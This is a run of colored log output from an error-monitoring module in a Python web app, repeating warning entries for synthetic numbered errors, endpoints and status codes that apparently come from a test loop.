WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.814593Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2378'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.814646Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2379'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.814696Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2380'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.814748Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2381'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.814798Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2382'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.814857Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2383'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.814908Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2384'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.814958Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2385'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.815008Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2386'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.815056Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2387'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.815148Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2388'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.815242Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2389'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.815352Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2390'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.815436Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2391'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.815529Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2392'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.815593Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2393'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.815648Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2394'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.815704Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2395'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.815755Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2396'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.815804Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2397'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.815853Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2398'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.815902Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m48[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2399'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.815952Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2400'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816005Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2401'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816054Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2402'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816103Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2403'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816151Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2404'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816199Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2405'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816248Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2406'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816296Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2407'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816344Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2408'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816391Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2409'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816439Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2410'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816486Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2411'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816534Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2412'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816583Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2413'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816633Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2414'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816680Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2415'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816727Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2416'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816775Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2417'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
